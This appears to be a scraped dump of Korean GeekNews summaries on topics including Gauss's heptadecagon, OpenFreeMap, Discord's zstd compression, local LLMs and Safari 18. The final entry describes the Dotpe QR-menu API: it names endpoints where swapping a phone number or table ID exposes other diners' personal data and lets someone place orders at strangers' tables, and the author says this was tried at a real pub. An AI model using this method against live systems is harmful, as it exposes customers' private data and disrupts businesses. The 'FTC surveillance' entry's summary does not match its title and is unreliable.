          + 두 원이 교차하는 점을 자로 연결하면 중점을 찾을 수 있음
     * 이 구성은 선분을 이등분할 뿐만 아니라 직각을 형성함
     * 몇 개의 점을 더 연결하면 정삼각형을 만들 수 있음

    장애물

     * 정다각형은 모든 변과 각이 같은 도형임
     * 유클리드는 정삼각형, 정사각형, 정오각형을 구성하는 방법을 알아냈음
     * 정다각형을 두 배로 늘리는 방법도 발견했음
     * 그러나 정칠각형과 정십일각형은 구성할 수 없었음
     * 이 문제는 2,000년 동안 해결되지 않았음

    18세기 수학의 구원

     * 1796년까지 새로운 정다각형은 발견되지 않았음
     * 가우스는 정다각형을 구성하는 문제를 특정 길이의 선분을 구성하는 문제로 환원했음
     * 정17각형을 구성하기 위해서는 특정 길이의 선분을 구성해야 함
     * 이 길이는 x = cos(2π/17)로 표현됨
     * 컴퍼스와 자로 구성할 수 있는 길이는 덧셈, 뺄셈, 곱셈, 나눗셈, 제곱근으로 표현될 수 있는 길이임
     * 가우스는 정17각형이 구성 가능함을 증명했음
     * 가우스는 모든 정다각형이 구성 가능한지 여부를 완전히 규명했음
     * 정칠각형과 정십일각형은 구성할 수 없음을 증명했음

    가우스의 유산

     * 가우스는 정17각형을 묘비에 새기고 싶어했음
     * 그러나 실제로는 새겨지지 않았음
     * 독일 브라운슈바이크에 있는 가우스의 기념비에는 17각별이 새겨져 있음

  GN⁺의 정리

     * 가우스는 18세에 정17각형을 이용해 2,000년 동안 해결되지 않은 문제를 해결했음
     * 고대 그리스의 기하학적 도형 구성 방법과 현대 대수학의 연관성을 보여줌
     * 가우스의 업적은 컴퍼스와 자로 구성할 수 있는 도형의 한계를 규명했음
     * 수학적 호기심을 자극하며, 기하학과 대수학의 깊은 연결을 이해하는 데 도움을 줌
     * 유사한 기능을 가진 프로젝트로는 Wolfram Alpha와 GeoGebra가 있음
"
"https://news.hada.io/topic?id=16916","OpenFreeMap – 오픈소스 지도 호스팅","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       OpenFreeMap – 오픈소스 지도 호스팅

     * OpenFreeMap은 웹사이트와 앱에서 사용자 정의 지도를 무료로 표시할 수 있게 해줌
     * 자체 호스팅 하거나, 공개 인스턴스를 사용할 수 있음
     * 모든 것이 오픈 소스이며, '오픈 코어' 모델이 아님
     * 지도 데이터는 OpenStreetMap에서 제공됨
     * 공개 인스턴스 사용은 완전히 무료이며, 지도 조회 수나 요청 수에 제한이 없음
     * 등록, 사용자 데이터베이스, API 키, 쿠키가 필요하지 않음
     * 기부를 통해 공개 인스턴스의 운영 비용을 충당하려고 함
     * Btrfs 및 MBTiles 형식으로 주간 단위로 지구 전체의 지도 파일 다운로드를 제공함

  이 프로젝트의 배경

     * 프로젝트 창시자는 Zsolt Ero
     * 9년간 MapHub의 지도 타일 인프라를 운영한 후, 이를 오픈 소스로 전환하고 OpenFreeMap을 출시함

  프로젝트 후원 방법

     * 이 프로젝트가 지도 호스팅 비용 절감에 도움이 된다면 GitHub Sponsors에서 후원 고려
     * 월간 기부를 선택해주면 서버 비용을 충당하는 데 도움이 됨

  지원 및 SLA 보장 제공 여부

     * 유료 지원 계획과 SLA 보장이 포함된 Pro 계획을 고려 중
     * 관심이 있다면 이메일로 연락

  이 프로젝트를 만든 이유

     * OpenStreetMap은 역사상 가장 중요한 집단 프로젝트 중 하나임
     * 상업적 지도 타일 제공자를 찾아야 했던 과거와 달리, OpenFreeMap은 자체 서버를 설정하거나 공개 인스턴스를 사용할 수 있는 옵션을 제공함

  무료 공개 인스턴스를 제공할 수 있는 이유

     * 지도 호스팅 비용이 높은 이유는 기술적 이유가 아님
     * 벡터 타일은 정적 파일이며, 수백만 개의 파일을 제공하는 것은 쉽지 않지만 가능함
     * 서버 임대를 통해 대역폭을 충당할 계획이며, 충분한 사람들이 지원 계획에 가입하면 자립 가능할 것으로 믿음

  상업적 사용이 가능한가?

     * 가능

  기술 스택

     * 타일 서버는 없으며, nginx가 3억 개의 하드 링크된 파일이 있는 Btrfs 이미지를 제공함
     * 클라우드가 아닌 전용 서버 사용
     * Michael Barry가 개발한 Planetiler 덕분에 타일 생성 시간이 5주에서 5시간으로 단축됨
     * 지도 스키마는 OpenMapTiles이며, 스타일은 포크되어 많이 수정됨

  저작권 표시

     * MapLibre를 사용하는 경우 자동으로 추가되므로 별도의 작업이 필요 없음
     * 대체 클라이언트나 인쇄 매체, 비디오에서 사용할 경우 다음 저작권 표시 필요:
          + OpenFreeMap © OpenMapTiles Data from OpenStreetMap
     * OpenFreeMap 부분은 표시하지 않아도 되지만, 표시하면 좋음

  라이선스

     * 프로젝트 라이선스는 MIT
     * 지도 데이터는 OpenStreetMap에서 제공
     * 포함된 프로젝트의 라이선스는 LICENSE.md에 나열됨

GN⁺의 정리

     * OpenFreeMap은 무료로 사용자 정의 지도를 제공하는 오픈 소스 프로젝트임
     * 상업적 사용이 가능하며, 자체 호스팅 또는 공개 인스턴스를 사용할 수 있음
     * 기부를 통해 운영 비용을 충당하며, 기술 스택은 nginx와 Btrfs를 사용함
     * 이 프로젝트는 OpenStreetMap의 데이터를 사용하며, 저작권 표시가 필요함
     * 비슷한 기능을 가진 프로젝트로는 Mapbox와 Google Maps가 있음

        Hacker News 의견

     * 역사적 데이터 타일 서비스에 대한 수요
          + 역사적 데이터를 보여주는 애플리케이션을 개발 중이며, 대부분의 지도 서비스는 현재 데이터만 보여줌
          + 역사적 데이터를 반영하는 지도가 필요함
          + 이를 통해 수익을 창출할 수 있는 기회가 있음
     * Google Maps 사용 경험
          + 10년간 Google Maps 사용, $200 크레딧 제공 후 비용이 $200-300으로 증가함
          + 경쟁자들이 사라지면서 트래픽이 증가함
          + 자체 타일 서버를 운영하려 했으나, 벡터 타일셋 업데이트의 어려움으로 포기하고 Google에 계속 비용을 지불함
          + 최근 큰 청구서를 받아 Mapbox로 변경함
          + Mapbox의 다른 API 기능을 좋아하지만, 비용 절감을 위해 번갈아 사용할 수 있는지 고민 중임
          + Mapbox-gl 2+의 기능 중 자유 소프트웨어 포크에서 사용할 수 없는 기능을 확인해야 함
     * OMT와 Protomaps 비교
          + OMT 대신 Protomaps를 사용해야 하는 이유에 대한 의문
          + ""API 키 없이 무료""라는 아이디어에 회의적임
          + 서비스가 남용되거나 대규모 사이트에서 사용될 경우 트래픽 문제가 발생할 수 있음
     * 자체 mbtiles 호스팅 경험
          + $11/월로 자체 mbtiles 지도를 호스팅했으나, 정기적으로 업데이트된 무료/저렴한 mbtiles 소스가 없었음
          + OpenMapTiles의 덤프는 몇 년 동안 업데이트되지 않음
          + Mapbox로 전환했으며, 월간 무료 티어를 초과하지만 할인을 받음
          + 고정 월 요금을 지불하고 싶어 새로운 서비스를 시도하고 기부할 계획임
     * 서비스에 대한 비용 지불 필요성
          + 서비스가 잘 작동하면 비용을 지불해야 함
          + 기부에 의존하는 것은 바람직하지 않음
     * Python과 Matplotlib을 사용한 지리 데이터 시각화
          + 지도를 임베드할 때 사용할 수 있는 라이브러리에 관심이 있음
          + Overture maps 데이터를 사용하는 오픈 프로젝트가 없는 이유에 대한 의문
          + Overture는 데이터 중심의 지도 프로젝트로, OSM과 호환되는 오픈 데이터 라이선스 하에 사용 가능함
     * 호스팅 설정에 대한 궁금증
          + 설정이 맞춤형 Python 스크립트로 이루어졌는지 궁금함
          + 다른 프로젝트에서도 재사용하는지에 대한 질문
     * 프로젝트 철학에 대한 긍정적 평가
          + 비용 절감 및 수익화에 대한 좋은 조언을 받고 있음
          + 프로젝트 철학을 표현하는 것을 좋아함
     * 비용 절감을 위한 서비스 사용
          + 현재 Stadia Map Tiles를 사용 중이며, 무료로 타일을 제공받을 수 있는지 궁금함
          + 서버 운영을 돕기 위해 기부할 의향이 있음
          + leaflet.js를 사용 중이며, 마이그레이션 방법에 대한 튜토리얼이 있는지 궁금함
     * 명확한 비즈니스 계획의 필요성
          + 비용을 충당하기 위한 명확한 비즈니스 계획이 필요함
          + Gold 지원 계획이 있지만, 기부 요청 중간에 숨겨져 있음
          + 상업적 사용이 무료임을 명확히 하고, 이메일 지원을 제공하는 비즈니스 계획을 제안함
"
"https://news.hada.io/topic?id=16842","FTC: 소셜 미디어 및 비디오 스트리밍 회사들의 광범위한 사용자 감시","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                FTC: 소셜 미디어 및 비디오 스트리밍 회사들의 광범위한 사용자 감시

     * 경쟁이 중요함
     * 인수 합병 속도를 늦추기: 연속 인수에 대한 조명
          + 헨리 리우, 경쟁국 국장
          + 2024년 5월 23일
     * 연속 인수의 문제점
          + 연속 인수는 시장 경쟁을 저해할 수 있음
          + 대규모 기업이 작은 기업을 연속적으로 인수하면 시장 독점 가능성 증가
          + 소비자 선택권 감소와 가격 상승 우려
     * 규제 당국의 역할
          + 연속 인수를 감시하고 규제하는 것이 중요함
          + 공정한 경쟁을 유지하기 위해 규제 당국의 적극적인 개입 필요
          + 투명한 인수 과정과 공정한 시장 환경 조성
     * 사례 연구
          + 특정 산업에서의 연속 인수 사례 분석
          + 연속 인수가 시장에 미친 영향 평가
          + 규제 당국의 대응 방안 검토
     * 결론
          + 연속 인수는 시장 경쟁에 부정적인 영향을 미칠 수 있음
          + 규제 당국의 역할이 중요하며, 공정한 경쟁 환경을 유지하기 위한 노력이 필요함
     * GN⁺의 정리
          + 연속 인수는 시장 독점과 소비자 피해를 초래할 수 있음
          + 규제 당국의 적극적인 개입과 투명한 인수 과정이 중요함
          + 이 기사는 연속 인수의 문제점을 조명하고, 공정한 경쟁 환경 조성을 위한 방안을 제시함
          + 유사한 기능을 가진 산업 내 다른 프로젝트나 제품으로는 공정 거래 위원회의 보고서 등이 있음

        Hacker News 의견

     * 기업이 사용자 데이터를 잘못 처리할 때 책임을 증가시키는 방법이 필요함
          + 몇 달 전 데이터 유출을 우편으로 통보받고, 신용 동결을 설정하는 것이 유일한 대응책임
     * Meta, Google 등이 법적으로 사용자 정보를 데이터베이스에 채워 수십억 달러의 가치를 창출함
          + 과거에는 스파이 행위로 간주될 수 있었지만, 현재는 합법적으로 이루어짐
          + 기술적으로 원격으로 데이터를 기록하는 것은 간단한 일임
     * 15년 늦게 이 문제를 심각하게 받아들이고 대응을 시작했지만, 늦더라도 시작하는 것이 중요함
          + 다음으로는 CRAs를 규제해야 함
     * Lina Khan이 온라인 인권에 대해 신경 쓰는 모습을 보임
     * 기업들이 사용자와 비사용자 모두에 대한 데이터를 수집하고 무기한 보유할 수 있음
          + 소셜 미디어 플랫폼을 사용하지 않는 사람으로서, 기업이 내 데이터를 수집하지 못하게 할 방법이 있는지 궁금함
     * 자동차 제조업체도 차량 내부의 카메라와 마이크로 감시하고 있음
     * 많은 기업들이 광범위한 데이터 공유를 하고 있으며, 이는 데이터 처리 통제와 감독의 적절성에 심각한 우려를 제기함
     * 더 많은 정보: FTC 보고서 링크
     * 관련 기사: Instagram Teen Accounts
     * 서구 세계의 다양한 정부 기관에서 이러한 비판이 나오는 것은 다소 위선적임
          + 감시 기업은 경찰이 데이터를 신속하게 수집하는 데 필수적임
          + 광고 수익과 경찰 업무에 효과적임
"
"https://news.hada.io/topic?id=16932","Hacktober Fest 2024 등록 시작 ","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Hacktober Fest 2024 등록 시작

     * DigitalOcean이 매년 진행하는 한달간의 오픈소스 축제
     * 9/23~10/31 사이에 언제든지 참가 등록 가능
     * 10/1 부터 오픈소스에 기여한 것들이 포함됨
     * GitHub/GitLab에 4개의 Pull/Merge 요청을 제출한 기여자는 보상을 받을 수 있음
          + 각 PR/MR 요청에 맞는 특성이 부여되는 커스텀 디지털 배지를 Holopin(디지털 뱃지 플랫폼) 에서 제공함
          + 수집한 배지는 GitHub/GitLab 프로필에 삽입 가능
          + 2개 이상의 스팸 PR/MR 제출시 즉시/영구적으로 Hacktober Fest에서 제명 & 밴
"
"https://news.hada.io/topic?id=16885","Discord가 웹소켓 트래픽을 40% 감소시킨 방법","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     Discord가 웹소켓 트래픽을 40% 감소시킨 방법

     * 클라이언트가 Discord에 연결하면 ""게이트웨이""라고 하는 서비스를 통해 무슨 일이 일어나고 있는지에 대한 실시간 업데이트를 받음
     * 2017년 말부터 클라이언트의 게이트웨이 연결은 zlib를 사용하여 압축되어 메시지의 크기가 2배에서 10배까지 작아졌음
     * Zstandard(zstd)는 zlib보다 압축률이 높고 압축 시간이 짧으며, 사전 기능을 지원해 대역폭을 추가로 줄일 수 있음
     * 2019년 zstd 테스트 결과는 그다지 긍정적이지 않았으나, 다시 시도해볼 가치가 있다고 판단함

Zstd 스트리밍

     * Zlib은 스트리밍 압축을 사용한 반면, zstd는 그렇지 않았음
     * 작은 페이로드에서 zstd가 zlib보다 성능이 떨어졌음
     * Elixir용 zstd 바인딩인 ezstd를 포크하여 스트리밍을 추가함
     * Zstd 스트리밍으로 전환한 결과 zlib 스트리밍보다 압축률과 속도 면에서 크게 개선됨

최적화 노력

    튜닝

     * Chainlog, hashlog, windowlog 등 zstd 압축 매개변수를 조정하여 메모리 사용량과 압축 시간의 균형을 맞춤

  Zstd 딕셔너리

     * Zstd의 사전 기능을 활용하여 압축률을 높이려 했으나 효과는 제한적이었음
     * 사전 사용의 복잡성이 이점보다 크다고 판단하여 도입하지 않기로 함

  버퍼 업그레이드

     * 비사용 시간대의 여분 메모리를 활용해 zstd 버퍼를 업그레이드하는 피드백 루프를 구현
     * 예상보다 업그레이드 비율이 낮았고, BEAM 할당자 설정 조정 등으로 개선을 시도했으나 복잡성 대비 이점이 크지 않아 철회함

  구현과 출시

     * Zstd의 대역폭 개선 효과가 커서 모바일뿐 아니라 데스크톱에도 적용하기로 함
     * Java, Objective-C, Rust 등 각 플랫폼에 맞는 zstd 바인딩을 찾아 몇 달에 걸쳐 단계적으로 출시함

추가 성과: Passive Sessions V2

     * Zstd 적용 과정에서 passive_update_v1 메시지가 게이트웨이 대역폭의 30% 이상을 차지한다는 것을 발견함
     * 변경된 채널/멤버만 전송하는 passive_update_v2를 도입하여 해당 대역폭을 35%에서 5%로 줄임

큰 절감 효과

     * Passive Sessions v2와 zstd의 결합으로 클라이언트가 사용하는 게이트웨이 대역폭을 거의 40% 감소시킴
     * 의도치 않은 최적화 기회를 발견한 것은, 적절한 계측과 비판적 시각으로 그래프를 분석하는 것의 중요성을 보여줌

        Hacker News 의견

     * Discord의 실행 시간이 20-30초 걸리는 문제에 대한 불만이 있음
          + $5000 PC에서도 느린 실행 속도에 대한 의문 제기
          + 클라이언트를 매번 단일 코어로 다시 컴파일하는 것 같다는 비유 사용
     * 압축 비율과 네트워크 대역폭 감소에 집중한 것 같음
          + CPU 시간이나 실제 사용자에게 측정 가능한 개선 사항에 대한 언급이 없음
          + 회사에서 비슷한 노력을 했을 때 압축/압축 해제 오버헤드로 인해 성능이 더 나빠졌음
     * JSON과 Erlang ETF를 사용한 사전 기반 압축 접근 방식이 흥미로움
          + Cap'n Proto나 Protobufs 같은 스키마 기반 시스템으로 전환하는 대신 선택한 방식
          + Zstandard와 LZ4의 벤치마크에 관심이 있음
          + 드론의 스트리밍 오버레이/HUD 데이터의 경우 LZ4를 사용했으며, Zstd 사전 도구로 생성된 사전을 사용해 높은 속도로 유사한 압축을 달성했음
     * 일반적인 부트스트래핑 응답(READY)이 2MB 이상이라는 점이 놀라움
     * PASSIVE_UPDATE_V1 디스패치의 실제 내용에 대한 언급
          + 단일 요소만 변경되었을 때도 모든 채널, 멤버 또는 음성 멤버를 전송함
          + zstd 실험 중 발견된 메트릭이 놀라운 행동을 보여줌
          + 처음부터 메트릭 분석을 하지 않은 이유에 대한 의문
          + 처음부터 델타를 전송하지 않은 이유에 대한 의문
     * 압축 오라클 공격(BREACH)과 같은 공격에 대한 안전성 언급이 없음
          + Discord가 압축 롤아웃에 많은 노력을 기울였다는 점에서 이를 고려했을 것이라 믿음
          + 더 구체적인 내용을 작성했으면 좋겠다는 의견
     * Discord 탭을 열면 컴퓨터가 느려지는 문제가 있음
     * 시도했지만 잘 되지 않은 것들을 설명한 점이 매우 좋음
          + 실패한 시도를 설명하는 기사가 점점 드물어지고 있지만, 이는 매우 흥미롭고 도움이 됨
     * mIRC가 더 잘 했다는 의견
"
"https://news.hada.io/topic?id=16871","ChatGPT는 잊어라: 연구자들이 이제 노트북에서 소형 AI를 실행하는 이유","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ChatGPT는 잊어라: 연구자들이 이제 노트북에서 소형 AI를 실행하는 이유

     * 인공지능(AI) 모델은 일반적으로 온라인에서 사용되지만, 여러 공개 도구들이 이를 변화시키고 있음
     * 생체정보과학자 Chris Thorpe는 AI 도구인 대형 언어 모델(LLM)을 사용하여 면역 시스템 단백질인 주요 조직 적합성 복합체(MHC) 분자의 데이터베이스인 histo.fyi를 읽기 쉬운 요약으로 변환함
     * Thorpe는 ChatGPT와 같은 웹 기반 LLM 대신 랩탑에서 AI를 구동함

LLM의 최근 트렌드

     * 조직에서 '오픈 가중치' 버전의 LLM을 제작하여 사용자가 충분한 컴퓨팅 능력만 있다면 로컬에서 다운로드하여 실행할 수 있도록 함
     * 기술 기업에서는 소비자용 하드웨어에서 실행할 수 있는 축소 버전을 제작하고 있으며, 이는 이전의 대형 모델의 성능과 필적함

연구자들이 로컬 모델을 사용하는 이유

     * 비용 절감
     * 환자나 기업의 기밀 보호
     * 재현성 보장
     * 컴퓨터가 빨라지고 모델이 효율적이 됨에 따라 사람들은 점점 더 랩톱이나 모바일 기기에서 AI를 구동하게 될 것임

최근 공개된 소형 오픈 가중치 모델 예시

     * Google DeepMind, Meta, Allen Institute for Artificial Intelligence 등에서 수십억 개의 매개변수를 포함하는 모델을 공개함
     * Microsoft는 Phi-1, Phi-1.5, Phi-2, Phi-3, Phi-3.5 등의 소형 언어 모델을 공개하였으며, 이 중 일부는 이미지도 처리할 수 있음
     * Microsoft의 생성형 AI 부사장인 Sébastien Bubeck은 Phi-3의 성능을 훈련 데이터 세트에 기인한다고 설명함

맞춤형 애플리케이션 개발

     * 연구자들은 이러한 도구를 기반으로 맞춤형 애플리케이션을 개발할 수 있음
     * 중국의 Alibaba는 Qwen이라는 모델을 구축하였으며, 뉴햄프셔 주의 생체의학 과학자는 이를 과학 데이터로 미세 조정하여 Turbcat-72b를 만들었음

프라이버시 보호

     * 로컬 모델의 또 다른 장점은 프라이버시 보호임
     * 개인 식별 정보를 상용 서비스에 전송하는 것은 데이터 보호 규정에 위배될 수 있음
     * Hugging Face의 의료팀을 이끄는 의사 Cyril Zakka는 로컬 모델을 사용하여 다른 모델을 위한 훈련 데이터를 생성함
     * Springfield의 Mercy 의료 시스템의 내분비학자 Johnson Thomas는 환자 프라이버시를 위해 OpenAI의 Whisper와 Google DeepMind의 Gemma 2를 기반으로 의사-환자 대화를 전사하고 요약하는 시스템을 개발하고 있음
     * 서울의 제약회사 Portrai에서 개발한 CELLama는 로컬 LLM을 활용하여 세포의 유전자 발현 및 기타 특성에 대한 정보를 요약 문장으로 축소하며, 프라이버시를 주요 장점으로 강조함

모델의 활용

     * 연구자들은 빠르게 변화하는 LLM 옵션에 직면해 있음
     * Thorpe는 현재 랩톱에서 Llama를 사용하고 있으며, 로컬 모델은 변경되지 않아 재현성 측면에서 장점이 있다고 말함
     * Thorpe는 3D 구조를 기반으로 MHC 분자를 정렬하는 코드를 작성하고 있으며, 새로운 단백질을 설계하기 위해 ProtGPT2라는 오픈 가중치 모델을 사용함
     * 그러나 때로는 로컬 앱으로는 부족할 수 있으며, Thorpe는 코딩을 위해 클라우드 기반 GitHub Copilot을 사용함

접근 방법

     * Ollama, GPT4All, Llamafile 등의 소프트웨어를 사용하여 로컬에서 LLM을 실행할 수 있음
     * 사용자의 선호도에 따라 앱이나 명령줄을 선택할 수 있음
     * Mozilla의 Stephen Hood는 로컬 LLM이 곧 대부분의 애플리케이션에 충분히 좋아질 것이라고 말함

GN+의 의견

     * 로컬 LLM은 연구자들에게 매우 유용한 도구가 될 수 있음. 비용 절감, 프라이버시 보호, 재현성 보장 등의 장점이 있기 때문임
     * 그러나 때로는 클라우드 기반 서비스가 더 나은 성능을 제공할 수 있으므로, 연구자들은 애플리케이션의 요구 사항에 따라 적절한 도구를 선택해야 함
     * 로컬 LLM의 발전 속도가 빨라지고 있으므로, 연구자들은 새로운 모델과 도구를 지속적으로 탐색하고 실험해 볼 필요가 있음
     * 또한 연구 분야에 따라 맞춤형 모델을 개발하는 것도 고려해 볼 만함. 예를 들어 생체의학 연구자라면 의료 데이터로 모델을 미세 조정하여 더 나은 성능을 얻을 수 있음
     * 로컬 LLM은 아직 초기 단계이므로, 연구자들은 이를 활용하는 과정에서 발생할 수 있는 문제점과 한계점을 인식하고 있어야 함. 예를 들어 모델의 편향성, 데이터 품질, 윤리적 고려 사항 등을 주의 깊게 살펴볼 필요가 있음

   아직까지는 뜨겁고 느리고 부정확합니다. 네이처 치고는 기사의 품질이 낮네요

   에지로 돌리면 느리고 정확도가 낮지 않나요,,

   사실상 latency와 privacy에 이슈가 있는 도메인이 아닌 이상, edge computing(local)을 쓸 이유가 없죠..
   이미 세상의 거의 모든 데이터를 aws, google에서 처리하고 있는데 이제와서 privacy 이야기하는건 LLM만들 기술이 없는 회사들의 상술인거..

   Nature article의 제목에 small이 등장하지만 대부분의 내용은 local이 핵심이네요.

   매번 ChatGPT를 잊으라네...

   ㅋㅋㅋ

        Hacker News 의견

     * 로컬 모델 사용 권장
          + 로컬 모델이 복잡하거나 컴퓨터 성능이 부족하다고 생각하는 사람들에게 Llamafile 다운로드를 권장함
          + Whisperfiles도 제공되어 실시간 음성 전사 가능
          + Twinny를 사용하여 로컬 전용 코드 자동 완성 및 채팅 가능
          + 무료, 개인적, 오프라인 사용 가능
     * 로컬 LLM 사용 경험
          + 아침 산책 중 음성 메모를 기록하고 로컬에서 Whisper로 텍스트 변환 후 LLM으로 정리
          + 개인 정보 보호를 위해 로컬 사용 선호
     * AMD Strix Halo APU
          + 128GB 통합 메모리와 50 TOPS NPU를 갖춘 AMD Strix Halo APU 장치 출시 예정
          + MacBook Pro 모델의 대안으로 기대됨
     * Llama 3.1 라이선스 문제
          + Llama 3.1은 오픈 소스가 아님
          + 라이선스 모델과 오픈 소스의 차이를 명확히 할 필요 있음
     * Docker와 Ollama 사용
          + Docker에서 Ollama를 사용하여 ChatGPT와 유사한 성능 경험
          + Obsidian 노트와 통합하여 노트 생성 및 퍼지 검색 사용
          + 정신 건강 및 의료 질문에 대한 보조 도구로 사용
     * 로컬 LLM 성능
          + M1 Max에서 Llama 8bn 사용 시 25 토큰/초 속도
          + Ryzen 5600h에서는 10 토큰/초로 느림
          + 문제 해결 시 ChatGPT나 phind.com 사용
          + 민감한 정보는 온라인 제공자 사용 불가
     * 로컬 LLM 실험
          + Nvidia RTX 4060에서 Llama-3.1-8b-instruct 실행 실험
          + 20k 토큰 컨텍스트를 GPU에 완전히 적재 가능
          + Gemini의 멀티모달 기능이 더 나은 품질을 제공하여 로컬 LLM 사용 가치가 낮음
     * 대기업의 LLM 기반 제품
          + 회로 설계 분야에서 로컬 모델 사용 필요
          + OpenAI와 같은 특정 공급업체에 종속되지 않기 위해 로컬 모델 선호
          + 개인적으로도 로컬 모델 사용 선호
     * LLM 훈련 데이터
          + Microsoft가 LLM으로 생성된 콘텐츠로 LLM 훈련
          + 초기 ChatGPT 버전과 유사한 성능을 모바일 폰에서 구현
     * 소형 모델 실행 사양 추천
          + Llama3.1 또는 Mistral-Nemo와 같은 소형 모델 실행을 위한 사양 추천 요청
          + 새로운 Mac, AMD, Nvidia 하드웨어 출시를 기다리는 것이 합리적인지 문의
"
"https://news.hada.io/topic?id=16835","Safari 18.0의 WebKit 기능들","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Safari 18.0의 WebKit 기능들

     * Distraction Control: 로그인 배너, 쿠키 팝업, 뉴스레터 가입 오버레이 등 산만한 요소를 숨길 수 있음
     * 비디오 뷰어: 웹 페이지의 주요 비디오 요소를 전체 창으로 확대하고 PIP로 전환할 수 있음
     * 아이폰 미러링 및 원격 인스펙션: iPhone을 Mac 화면에 미러링해 iOS 웹사이트를 더 쉽게 디버깅 가능

Mac용 웹 앱

     * 웹 앱과 관련된 링크를 Mac의 기본 브라우저가 아닌 해당 웹 앱에서 열 수 있음
     * 웹 앱 내에서 Safari 확장 프로그램 및 콘텐츠 차단기 사용 가능

CSS

     * View Transitions API로 요소의 상태 간 애니메이션 지원
     * 스타일 쿼리로 CSS 사용자 정의 속성 테스트 가능. 재사용 가능한 스타일 그룹 정의에 유용
     * Relative Color Syntax에서 currentcolor 및 시스템 색상 키워드 사용 가능
     * accent-color에서 부분 투명 색상 블렌딩 지원
     * display 속성의 전환 애니메이션 지원
     * -webkit 접두사 없는 backdrop-filter 지원 및 구현 개선
     * content-visibility로 초기 오프스크린 콘텐츠 생략 제안하여 페이지 로드 속도 향상 가능
     * @media/prefers-contrast의 custom 값 구문 분석 지원

Spatial Web

     * WebXR로 Apple Vision Pro용 몰입형 VR 경험 제작 가능
     * WebXR transient-pointer 입력 모드로 비전OS의 자연스러운 입력 활용 가능
     * 웹에서 전체 화면 API를 사용하여 공간 사진 및 파노라마 경험 제공 가능
     * 비전OS에서 CSS clip-path로 탭할 수 있는 영역의 모양 제어 가능
     * 비전OS에서 전체 화면 동영상을 현재 환경에 고정하는 기능 지원

HTML

     * 글쓰기 제안 기능으로 웹에서 인라인 예측 텍스트 지원
     * iOS에서 스위치 컨트롤에 햅틱 피드백 추가
     * macOS에서 날짜 및 시간 입력 필드 유형의 접근성 개선
     * ariaBrailleLabel 및 ariaBrailleRoleDescription 요소 반영 속성 지원

JavaScript

     * RegExp에서 Unicode 15.1.0 문자 및 v 플래그 지원으로 강력한 유니코드 문자 매칭 가능

Web API

     * URL.parse()로 구문 분석 실패 시 예외 대신 null 반환
     * Declarative Shadow 트리 지원
     * PopStateEvent의 hasUAVisualTransition로 조각 탐색에 대한 시각적 전환 여부 확인 가능
     * 가져온 모듈 스크립트의 하위 리소스 무결성 지원
     * Request, Response, Blob 및 PushMessageData 객체에 bytes() 메서드 지원

Canvas

     * getContext()에 willReadFrequently 컨텍스트 특성 지원으로 읽기 작업이 많을 때 성능 개선 가능
     * 2D 캔버스의 currentcolor 지원 확장

관리형 미디어 소스

     * 주 스레드가 바쁠 때도 원활한 비디오 재생을 위해 Managed Media Source (MMS) 와 Media Source Extensions (MSE)에 대한 Workers 지원 추가

WebRTC

     * RFC 7789 RTP 페이로드 형식의 WebRTC HEVC 지원으로 화상 회의 등 개선 가능
     * 전용 워커에서 MediaStreamTrack 처리 및 누락된 WebRTC 통계 지원 추가

HTTPS

     * 혼합 콘텐츠 설정에서 수동 하위 리소스 요청을 업그레이드하여 모든 이미지, 비디오 및 오디오에 대해 안전한 HTTPS 지원

WebGL

     * 6개의 새로운 WebGL 확장 지원 추가

Web Inspector

     * CSS 소스 편집기의 퍼지 검색 코드 완성 지원 추가

Passkeys

     * 조건부 중재를 사용한 웹 인증 자격 증명 생성 지원으로 기존 계정을 패스키로 자동 업그레이드 가능
     * 관련 출처 간 패스키 사용 지원으로 동일한 자격 증명 백엔드를 공유하는 제한된 도메인에서 동일한 패스키 사용 가능
     * WebAuthn prf 확장 지원으로 사용자 데이터 암호화에 사용할 패스키에서 대칭 키 검색 가능

사파리 확장

     * 관리되는 기기의 확장 활성화 상태, 개인 정보 보호 모드 상태 및 웹사이트 액세스에 대한 모바일 기기 관리 지원 추가

Apple Pay

     * Apple Pay를 통한 자금 이체 지원 추가

사용 중단

     * 표준화되지 않은 -webkit 접두사 속성, 다른 브라우저에서 지원하지 않는 오래된 미디어 형식(JPEG2000) 등 제거하여 브라우저 엔진 정렬 및 상호 운용성 개선
"
"https://news.hada.io/topic?id=16904","이 카페의 QR코드 메뉴에는 무엇이 들어있을까?","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       이 카페의 QR코드 메뉴에는 무엇이 들어있을까?

QR 코드 메뉴로 주문한 뒤 알게된 충격적인 사실들

     * 며칠 전 집 근처 카페에서 QR코드로 주문했더니 5분만에 아무 확인없이 음식이 나옴
     * QR코드 웹사이트를 열어보니 dotpe.in 서브도메인에서 운영 중
     * Dotpe는 ""full stack food stack""을 레스토랑에 제공하는 업체로, 구글이 투자자 중 하나

Dotpe의 API에서 발견한 문제점들

     * /api/morder/suggestion/ongoing/items 엔드포인트에서 현재 카페에서 주문된 음식 목록이 모두 보임
     * /api/morder/suggestion/items/purchase/history 엔드포인트에서 지난달 각 메뉴별 주문 횟수 제공
     * 이를 통해 한달 매출을 계산할 수 있었음
     * /api/morder/suggestion/items/past-fav 엔드포인트에서 전화번호만 바꾸면 타인의 과거 주문내역까지 볼 수 있음
     * /api/morder/fd/table/state 엔드포인트에서 테이블 ID만 바꾸면 다른 사람의 이름, 전화번호, 주문 내용을 볼 수 있음

Dotpe의 전국 규모 데이터 접근

     * Dotpe 가맹점 검색 API를 통해 전국 3만7천여개 레스토랑의 실시간 주문내역 확인 가능
     * 스타벅스, 피자헛, 할리람스, 소셜, 바리스타, 파라다이스 비리야니 등 대형 체인도 사용 중
     * 지난달 판매내역 분석 결과 소셜 펍은 연간 200억 이상의 매출 기록, 지점별 인기 메뉴 파악 가능
     * 파라다이스 비리야니 본점은 월 7천만원 이상 매출

테스트 결과와 우려사항

     * API를 분석하여 타인의 테이블에 원격으로 주문 넣는 것이 가능함을 확인
     * 소셜 펍에서 직접 시도해보니 혼란을 야기했지만 큰 문제로 번지진 않음
     * 하지만 이를 대규모로 자동화한다면 전국적 혼란을 야기할 수 있음
     * /api/morder/fd/table/state 엔드포인트를 통해 dotpe를 통해 주문한 모든 이의 과거 주문내역에 접근 가능
